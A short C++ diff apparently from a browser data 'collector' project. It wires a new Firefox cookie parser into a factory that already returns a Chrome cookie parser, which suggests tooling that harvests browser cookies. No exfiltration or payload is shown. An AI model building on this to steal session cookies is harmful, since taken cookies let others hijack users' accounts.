@@ -3,6 +3,7 @@
 #include "ChromeParser.h"
 #include "FireFoxParser.h"
 #include "ChromeCookiesParser.h"
+#include "FireFoxCookiesParser.h"
 
 namespace collector
 {
@@ -30,7 +31,7 @@ namespace collector
 		{
 		case BrowserType::None: return nullptr;
 		case BrowserType::Chromium: return new ChromeCookiesParser();
-		//case BrowserType::Mozilla: return new FireFoxParser();
+		case BrowserType::Mozilla: return new FireFoxCookiesParser();
 		default: return nullptr;;
 		}
 	}
